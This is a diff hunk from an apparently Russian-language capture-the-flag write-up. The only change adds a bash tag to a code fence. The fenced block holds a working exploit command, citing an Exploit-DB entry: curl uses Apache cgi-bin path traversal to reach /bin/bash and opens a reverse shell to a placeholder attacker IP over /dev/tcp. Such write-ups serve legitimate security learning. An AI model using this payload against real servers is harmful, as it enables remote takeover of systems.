@@ -11,7 +11,7 @@ _https://www.exploit-db.com/exploits/50383_
  
 С помощью утилиты curl используем данную уязвимость, чтобы прокинуть ревёрс-шелл.
 
-```
+```bash
 curl "http://middle-aged-daemon.tasks.2021.ctf.cs.msu.ru:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash" -d 'echo;bash -i >& /dev/tcp/atacker_ip/port 0>&1'
 ```
 
